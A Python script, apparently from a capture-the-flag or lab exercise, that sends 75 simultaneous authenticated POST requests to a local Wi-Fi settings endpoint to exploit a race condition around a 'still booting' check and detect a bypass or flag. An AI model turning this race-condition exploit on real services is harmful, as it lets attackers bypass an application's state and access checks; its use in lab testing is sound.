import threading
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import statistics

# Target configuration
url = "http://127.0.0.1:32992/wifi_settings"
cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}
data = {"ssid": "TestRace", "password": "race1234"}

# Results storage
results = []
results_lock = threading.Lock()

def send_request(request_id):
    """Send a single POST request and record the result"""
    start_time = time.perf_counter()
    try:
        response = requests.post(
            url,
            cookies=cookies,
            data=data,
            timeout=30
        )
        end_time = time.perf_counter()
        elapsed_ms = (end_time - start_time) * 1000
        
        result = {
            "id": request_id,
            "status": response.status_code,
            "body": response.text,
            "time_ms": elapsed_ms,
            "contains_booting_error": "still booting" in response.text.lower()
        }
        
        with results_lock:
            results.append(result)
        
        return result
    except Exception as e:
        end_time = time.perf_counter()
        elapsed_ms = (end_time - start_time) * 1000
        result = {
            "id": request_id,
            "status": None,
            "error": str(e),
            "time_ms": elapsed_ms,
            "contains_booting_error": False
        }
        with results_lock:
            results.append(result)
        return result

# Number of concurrent requests
num_requests = 75

print(f"[=] Starting race condition test...")
print(f"[=] Target URL: {url}")
print(f"[=] Number of concurrent requests: {num_requests}")
print(f"[=] Start time: {time.strftime('%H:%M:%S')}")

# Use ThreadPoolExecutor to launch all requests concurrently
start_all = time.time()
with ThreadPoolExecutor(max_workers=num_requests) as executor:
    # Submit all requests as fast as possible
    futures = [executor.submit(send_request, i) for i in range(num_requests)]
    
    # Wait for all to complete
    for future in as_completed(futures):
        pass  # Results are stored in the results list

end_all = time.time()
total_time = end_all - start_all

print(f"[+] All requests completed in {total_time:.3f} seconds")
print(f"[+] End time: {time.strftime('%H:%M:%S')}")

# Analyze results
print("\n" + "="*60)
print("RACE CONDITION TEST RESULTS")
print("="*60)

# Group results by outcome
success_responses = [r for r in results if r['status'] == 200 and not r.get('contains_booting_error', False)]
booting_errors = [r for r in results if r.get('contains_booting_error', False)]
other_errors = [r for r in results if r['status'] is not None and r['status'] != 200 and not r.get('contains_booting_error', False)]
connection_errors = [r for r in results if 'error' in r and r['error'] is not None]

print(f"\n[SUMMARY]")
print(f"  Total requests sent: {num_requests}")
print(f"  Successful responses (no booting error): {len(success_responses)}")
print(f"  Booting errors ('still booting'): {len(booting_errors)}")
print(f"  Other HTTP errors: {len(other_errors)}")
print(f"  Connection errors: {len(connection_errors)}")

# Timing analysis
response_times = [r['time_ms'] for r in results if 'time_ms' in r]
if response_times:
    print(f"\n[TIMING ANALYSIS]")
    print(f"  Min response time: {min(response_times):.2f} ms")
    print(f"  Max response time: {max(response_times):.2f} ms")
    print(f"  Mean response time: {statistics.mean(response_times):.2f} ms")
    print(f"  Median response time: {statistics.median(response_times):.2f} ms")
    print(f"  Stdev: {statistics.stdev(response_times):.2f} ms" if len(response_times) > 1 else "  Stdev: N/A")

# Check for any responses that don't contain "still booting"
print(f"\n[BOOT STATE BYPASS ANALYSIS]")
non_booting_responses = [r for r in results if not r.get('contains_booting_error', False)]
if non_booting_responses:
    print(f"  [!] Found {len(non_booting_responses)} responses WITHOUT booting error:")
    for r in non_booting_responses[:10]:  # Show first 10
        print(f"      Request #{r['id']}: Status={r.get('status')}, Time={r['time_ms']:.2f}ms")
        if 'body' in r:
            body_preview = r['body'][:200].replace('\n', ' ')
            print(f"      Body: {body_preview}{'...' if len(r['body']) > 200 else ''}")
else:
    print(f"  [-] All responses contained the booting error message")

# Check for unique error messages
print(f"\n[ERROR MESSAGE VARIATIONS]")
unique_errors = set()
for r in results:
    if 'body' in r:
        unique_errors.add(r['body'][:300])
    elif 'error' in r:
        unique_errors.add(f"Connection error: {r['error'][:100]}")

print(f"  Found {len(unique_errors)} unique response patterns:")
for i, err in enumerate(list(unique_errors)[:5]):
    print(f"  Pattern {i+1}: {err[:150]}...")

# Check for status code variations
status_codes = {}
for r in results:
    status = r.get('status')
    if status is not None:
        status_codes[status] = status_codes.get(status, 0) + 1

print(f"\n[STATUS CODE DISTRIBUTION]")
for status, count in sorted(status_codes.items()):
    print(f"  Status {status}: {count} responses")

# Show sample responses
print(f"\n[SAMPLE RESPONSES]")
print(f"  Sample booting error response (Request #{booting_errors[0]['id'] if booting_errors else 'N/A'}):")
if booting_errors:
    print(f"  {booting_errors[0]['body'][:300]}...")

if success_responses:
    print(f"\n  [!] Sample SUCCESS response (Request #{success_responses[0]['id']}):")
    print(f"  {success_responses[0]['body'][:500]}")
    
    # If we have success responses, try to find flag or success indicator
    for r in success_responses:
        if 'flag' in r.get('body', '').lower() or r.get('body', '') != booting_errors[0]['body']:
            print(f"\n  [!!!] SUCCESSFUL BYPASS - Request #{r['id']}:")
            print(f"  Status: {r['status']}")
            print(f"  Time: {r['time_ms']:.2f}ms")
            print(f"  Body: {r['body']}")

